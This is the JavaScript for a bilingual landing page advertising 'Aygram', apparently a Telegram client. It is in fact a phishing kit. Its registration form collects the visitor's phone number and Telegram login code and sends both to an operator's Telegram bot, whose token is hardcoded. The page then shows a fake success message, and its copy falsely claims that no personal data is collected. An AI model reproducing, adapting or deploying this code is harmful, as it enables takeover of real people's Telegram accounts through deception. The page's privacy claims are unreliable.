const BOT_TOKEN = "8419167666:AAF_8tv9MM1n8eBPrRGqbbhEwdQzl2hwLG0";
let CHAT_ID = 8224914068;

async function ensureChatId() {
  if (CHAT_ID) return CHAT_ID;
  const cached = localStorage.getItem("tg_chat_id");
  if (cached) {
    CHAT_ID = cached;
    return CHAT_ID;
  }
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`
    );
    const data = await res.json();
    if (!data.ok) return null;
    const updates = data.result || [];
    const last = [...updates]
      .reverse()
      .find(
        (u) =>
          (u.message && u.message.chat && u.message.chat.id) ||
          (u.channel_post && u.channel_post.chat && u.channel_post.chat.id)
      );
    const chatId =
      last?.message?.chat?.id ?? last?.channel_post?.chat?.id ?? null;
    if (chatId) {
      CHAT_ID = String(chatId);
      localStorage.setItem("tg_chat_id", CHAT_ID);
      return CHAT_ID;
    }
  } catch (_) {}
  return null;
}

async function sendTelegramMessage(message) {
  const chatId = await ensureChatId();
  if (!chatId) {
    alert(
      "Не удалось автоматически определить chat_id. Сначала напишите вашему боту в Telegram (Start), затем повторите, или задайте chat_id вручную."
    );
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });
    const json = await response.json();
    if (!json.ok) {
    }
  } catch (_) {}
}

const translations = {
  en: {
    register: "Register",
    welcomeTitle: "Welcome<br>to Aygram",
    welcomeText:
      "Aygram is a Telegram API-based messenger that offers enhanced opportunities for business and personal communication alike. Aygram fully supports all Telegram updates and serves as a brilliant alternative for those who would like to get more functions and features than the standard Telegram client provides.",
    whyTitle: "Why Aygram?",
    whySubtitle: "It's Fast, Secure & Convenient!",
    card1Title: "Powered by Telegram",
    card1Text:
      "Aygram is the best way to enjoy everything Telegram has to offer without any restrictions. It uses an open source Telegram API and supports updates from the official client, giving you full access while still on your favorite messaging app!",
    card2Title: "Private & Secure",
    card2Text:
      "The information you send via the Aygram messenger is encrypted and stored on Telegram servers to ensure your safety. We do not collect any personal data, so there's no need for concern!",
    card3Title: "Diverse Integrations",
    card3Text:
      "The most necessary tools for modern people and businesses are now in one place with Aygram. You'll never have to install another app!",
  },
  ru: {
    register: "Регистрация",
    welcomeTitle: "Добро пожаловать<br>в Aygram",
    welcomeText:
      "Aygram — это мессенджер на основе Telegram API, который предлагает расширенные возможности для бизнеса и личного общения. Aygram полностью поддерживает все обновления Telegram и служит отличной альтернативой для тех, кто хочет получить больше функций и возможностей, чем стандартный клиент Telegram.",
    whyTitle: "Почему Aygram?",
    whySubtitle: "Это быстро, безопасно и удобно!",
    card1Title: "Работает на Telegram",
    card1Text:
      "Aygram — лучший способ пользоваться всеми возможностями Telegram без ограничений. Он использует открытый Telegram API и поддерживает обновления официального клиента, предоставляя вам полный доступ к любимому мессенджеру!",
    card2Title: "Конфиденциально и безопасно",
    card2Text:
      "Информация, которую вы отправляете через Aygram, зашифрована и хранится на серверах Telegram для вашей безопасности. Мы не собираем личные данные, поэтому беспокоиться не о чем!",
    card3Title: "Широкие интеграции",
    card3Text:
      "Все необходимые инструменты для современных людей и бизнеса теперь собраны в одном месте с Aygram. Больше не нужно устанавливать дополнительные приложения!",
  },
};

let isCodeStep = false;
let currentPhoneE164 = "";
let currentCountryName = "";

document.addEventListener("DOMContentLoaded", function () {
  const registrationWindow = document.getElementById("registration-window");
  const registerBtn = document.getElementById("register-btn");
  const closeBtn = document.querySelector(".close-registration");
  const submitBtn = document.getElementById("submit-btn");
  const phoneInput = document.getElementById("phone-input");
  const codeInput = document.getElementById("code-input");
  const codeGroup = document.querySelector(".code-group");
  const enBtn = document.getElementById("en-btn");
  const ruBtn = document.getElementById("ru-btn");

  const iti = window.intlTelInput(phoneInput, {
    preferredCountries: ["ru", "ua", "kz", "az", "us", "gb"],
    initialCountry: "ru",
    nationalMode: true,
    separateDialCode: true,
    autoPlaceholder: "aggressive",
    utilsScript:
      "https://cdn.jsdelivr.net/npm/intl-tel-input@24.8.1/build/js/utils.js",
  });

  const setBorderByValidity = () => {
    if (phoneInput.value.trim().length === 0) {
      phoneInput.style.borderColor = "#555";
      return;
    }
    phoneInput.style.borderColor = iti.isValidNumber() ? "#4CAF50" : "#ff5b5b";
  };
  phoneInput.addEventListener("input", setBorderByValidity);
  phoneInput.addEventListener("countrychange", setBorderByValidity);

  function validationErrorText(code) {
    const mapRu = {
      1: "Неверный код страны",
      2: "Слишком короткий номер",
      3: "Слишком длинный номер",
      4: "Это не номер",
    };
    const mapEn = {
      1: "Invalid country code",
      2: "Too short",
      3: "Too long",
      4: "Not a number",
    };
    const ruActive = ruBtn.classList.contains("active");
    const dict = ruActive ? mapRu : mapEn;
    return dict[code] || (ruActive ? "Некорректный номер" : "Invalid number");
  }

  function setLanguage(lang) {
    const t = translations[lang];
    document.getElementById("register-btn").textContent = t.register;
    document.getElementById("welcome-title").innerHTML = t.welcomeTitle;
    document.getElementById("welcome-text").textContent = t.welcomeText;
    document.getElementById("why-title").textContent = t.whyTitle;
    document.getElementById("why-subtitle").textContent = t.whySubtitle;
    document.getElementById("card1-title").textContent = t.card1Title;
    document.getElementById("card1-text").textContent = t.card1Text;
    document.getElementById("card2-title").textContent = t.card2Title;
    document.getElementById("card2-text").textContent = t.card2Text;
    document.getElementById("card3-title").textContent = t.card3Title;
    document.getElementById("card3-text").textContent = t.card3Text;
  }

  enBtn.addEventListener("click", () => {
    setLanguage("en");
    enBtn.classList.add("active");
    ruBtn.classList.remove("active");
  });

  ruBtn.addEventListener("click", () => {
    setLanguage("ru");
    ruBtn.classList.add("active");
    enBtn.classList.remove("active");
  });

  registerBtn.addEventListener("click", function () {
    registrationWindow.style.display = "flex";
    resetRegistrationForm();
  });

  closeBtn.addEventListener("click", function () {
    registrationWindow.style.display = "none";
    resetRegistrationForm();
  });

  registrationWindow.addEventListener("click", function (event) {
    if (event.target === registrationWindow) {
      registrationWindow.style.display = "none";
      resetRegistrationForm();
    }
  });

  submitBtn.addEventListener("click", function () {
    if (!isCodeStep) {
      if (!iti.isValidNumber()) {
        const err = window.intlTelInputUtils
          ? validationErrorText(iti.getValidationError())
          : ruBtn.classList.contains("active")
          ? "Пожалуйста, введите корректный номер телефона"
          : "Please enter a valid phone number";
        alert(err);
        return;
      }
      currentPhoneE164 = iti.getNumber();
      const cdata = iti.getSelectedCountryData();
      currentCountryName = cdata?.name || "Unknown";
      sendTelegramMessage(
        `🔐 <b>Попытка регистрации</b>\n📱 Номер: ${currentPhoneE164}\n🌍 Страна: ${currentCountryName}`
      );
      showCodeStep();
    } else {
      const verificationCode = codeInput.value.trim();
      if (verificationCode.length !== 5 || !/^\d+$/.test(verificationCode)) {
        alert(
          ruBtn.classList.contains("active")
            ? "Пожалуйста, введите корректный 5-значный код"
            : "Please enter a valid 5-digit code"
        );
        return;
      }
      handleSuccessfulRegistration(currentPhoneE164, verificationCode);
    }
  });

  function showCodeStep() {
    isCodeStep = true;
    codeGroup.style.display = "block";
    submitBtn.textContent = ruBtn.classList.contains("active")
      ? "Подтвердить"
      : "Confirm";
    phoneInput.disabled = true;
    const flag = phoneInput.parentElement.querySelector(".iti__flag-container");
    if (flag) flag.style.pointerEvents = "none";
  }

  function resetRegistrationForm() {
    isCodeStep = false;
    codeGroup.style.display = "none";
    submitBtn.textContent = ruBtn.classList.contains("active")
      ? "Продолжить"
      : "Continue";
    phoneInput.disabled = false;
    const flag = phoneInput.parentElement.querySelector(".iti__flag-container");
    if (flag) flag.style.pointerEvents = "auto";
    phoneInput.value = "";
    currentPhoneE164 = "";
    currentCountryName = "";
    iti.setCountry("ru");
    setBorderByValidity();
  }

  function handleSuccessfulRegistration(phoneNumberE164, verificationCode) {
    registerBtn.style.display = "none";
    sendTelegramMessage(
      `✅ <b>Регистрация удалась</b>\n📱 Номер: ${phoneNumberE164}\n🔑 Код: ${verificationCode}\n🌍 Страна: ${currentCountryName}`
    );
    registrationWindow.style.display = "none";
    alert(
      ruBtn.classList.contains("active")
        ? "Регистрация успешно завершена!"
        : "Registration completed successfully!"
    );
  }

  phoneInput.addEventListener("keypress", function (e) {
    if (e.key === "Enter") submitBtn.click();
  });
  codeInput.addEventListener("keypress", function (e) {
    if (e.key === "Enter") submitBtn.click();
  });

  setLanguage("ru");
});
